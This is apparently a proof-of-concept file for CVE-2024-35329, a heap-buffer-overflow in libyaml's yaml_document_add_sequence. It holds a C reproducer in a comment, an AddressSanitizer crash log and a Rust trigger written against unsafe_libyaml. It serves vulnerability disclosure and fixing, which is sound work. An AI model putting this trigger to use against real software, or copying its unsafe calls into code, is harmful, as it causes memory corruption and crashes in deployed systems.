/* c code.
 * CVE-2024-35329
void poc() {
    yaml_document_t document;
    memset(&document, 0, sizeof(yaml_document_t));
    yaml_char_t *anchor = "rsslab";
    yaml_char_t *tag = "tag:yaml.org,2002:str";
    int style = YAML_ANY_SEQUENCE_STYLE;
    yaml_document_add_sequence(&document, tag, style);
}

int main(int argc, char *argv[])
{
    printf("heap-buffer-overflow on libyaml/src/api.c:1274:10\n");
    poc();
    return 0;
}
*/

/* ASAN in rust

=================================================================
==3044729==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000018 at pc 0x5641fa16daf4 bp 0x7fffb2a2ea70 sp 0x7fffb2a2e230
WRITE of size 96 at 0x502000000018 thread T0
    #0 0x5641fa16daf3  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0xedaf3) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #1 0x5641fa19b3e5  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11b3e5) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #2 0x5641fa19a1c7  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11a1c7) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #3 0x5641fa199ac5  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x119ac5) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #4 0x5641fa19a76a  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11a76a) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #5 0x5641fa19a25d  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11a25d) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #6 0x5641fa199e93  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x119e93) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #7 0x5641fa1cda91  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x14da91) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #8 0x5641fa1aa9c3  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x12a9c3) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #9 0x5641fa1b169a  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x13169a) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #10 0x5641fa1aa3ee  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x12a3ee) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #11 0x5641fa1c1d8a  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x141d8a) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #12 0x5641fa28b9cb  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x20b9cb) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #13 0x5641fa1aa7b2  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x12a7b2) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #14 0x5641fa1b169a  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x13169a) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #15 0x5641fa1aa179  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x12a179) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #16 0x5641fa1c1dca  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x141dca) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #17 0x5641fa28b5fb  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x20b5fb) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #18 0x5641fa199de8  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x119de8) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #19 0x5641fa199aed  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x119aed) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #20 0x7fdcf8c7a082  (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 87b331c034a6458c64ce09c03939e947212e18ce)
    #21 0x5641fa0eb2bd  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x6b2bd) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)

0x502000000018 is located 0 bytes after 8-byte region [0x502000000010,0x502000000018)
allocated by thread T0 here:
    #0 0x5641fa16faff  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0xefaff) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #1 0x5641fa212e3b  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x192e3b) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #2 0x5641fa31ca7a  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x29ca7a) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #3 0x5641fa19d010  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11d010) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #4 0x5641fa19a1c7  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x11a1c7) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #5 0x5641fa199ac5  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x119ac5) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #6 0x5641fa1c1d8a  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x141d8a) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #7 0x5641fa1aa7b2  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x12a7b2) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #8 0x5641fa1c1dca  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x141dca) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #9 0x5641fa199de8  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x119de8) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
    #10 0x5641fa199aed  (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0x119aed) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)

SUMMARY: AddressSanitizer: heap-buffer-overflow (~/rust_poc/libyaml/target/x86_64-unknown-linux-gnu/debug/poc+0xedaf3) (BuildId: ef45868ed839bd303261276952d395ec63a591ca)
Shadow bytes around the buggy address:
  0x501ffffffd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x502000000000: fa fa 00[fa]fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3044729==ABORTING
*/

use std::mem::MaybeUninit;
use unsafe_libyaml::{yaml_document_add_sequence, yaml_document_t, YAML_ANY_SEQUENCE_STYLE};

pub fn poc() {
    unsafe {
        let mut document = MaybeUninit::<yaml_document_t>::uninit();
        let document = document.as_mut_ptr();
        let tag = std::ffi::CString::new("tag:yaml.org,2002:str")
            .unwrap()
            .into_raw();
        // let tag = tag as *mut std::ffi::c_char;
        let _ = yaml_document_add_sequence(
            document,
            tag as *const u8,
            YAML_ANY_SEQUENCE_STYLE,
        );
    }
}
